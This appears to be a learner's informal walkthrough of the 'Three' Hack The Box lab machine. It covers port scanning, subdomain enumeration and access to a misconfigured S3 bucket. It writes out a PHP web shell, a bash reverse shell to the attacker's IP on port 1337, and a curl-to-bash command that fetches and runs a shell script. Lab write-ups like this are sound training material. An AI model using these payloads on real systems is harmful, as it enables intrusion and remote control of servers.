“Three” Machine 

Pinged to check if its running as usual 

Ran “nmap -p- -sC -sV -min-rate 1000  10.129.227.248”  to see all the service that is running in all the port and set the min-rate to 1000 so that it will run faster 

saw a warning while scanning “Warning: 10.129.227.248 giving up on port because retransmission cap hit (10).” happen because I was using min-rate to send 1000 packets per second to speed it up a bit so nmap gave up on a port  possibly because it had a firewall or the port is not running 

It seems it has a open 22/tcp port which is a Open ssh service and port 80/tcp running a http server and the OS seems to be linux 

tried to access the ssh tried giving passwords like admin, root  but no dice 

open the http ip in the browser noticed routes like “/#contact”  or maybe I am missing something 

had to go through the walkthrough saw that when I submit the contact it requests  to  a php file that doesnt exist it seems 

and there seems to be a email mentioned in the contact page with domain thetoppers.htb, we will trying adding it to the etc/host/ 

now it seems are going to do subdomain enumeration  since gobuster dir doesnt return anything useful we will be looking using vhost 

we run gobuster vhost -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb, vhost  to get the websites  in a single ip which might have multiple websites  like different subdomain 


I need to add “— append-domain” too in the gobuster command or else it wont send the domain in the request with the wordlist 

now we need to add the s3.thetoppers.htb which we found while enumerating to the etc/host for resolving 

now we are going to use awscli to connect to the s3 bucket   
now we can see that there is an index.php file in the s3 bucket and also .htaccess which means the apache server is usings s3 as a storage and we can upload a shell.php to the s3 bucket 

we create a shell.php using : echo '<?php system($_GET["cmd"]); ?>' > shell.php, so what system does is to help run commands on the server so since we added this to the s3 bucket now when we pass a command in url by going to the shell directory  it will return the results 

like this : “http://thetoppers.htb/shell.php?cmd=id” if it gives a response we can conclude that we can use reverse shell (now whats that lol - lets see ) 

since we have web shell access we will do reverse shell by opening a port in our server  and then we will make shell.sh file with the command   “bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1”   -i means its interactive terminal 
middle part means to connect to tcp port in the given ipaddress 
>& means all stdout to be redirected  0>&1 all the stdin from also the same place as std out

now we have to execute this the victims server so that we get the access in our ncat server 

to server this shell file we will run a python3 server on the same directory where the shell.sh is to serve the file   then in cmd= we will pass curl%20<our ip>:<python server port number > /shell.sh  | bash  
‘|’ is for piping to output from the first curl command to the bash next the bash gets excecuted   now once thats run, in our ncat server we can see the full shell access and get the flag   

  
  


  
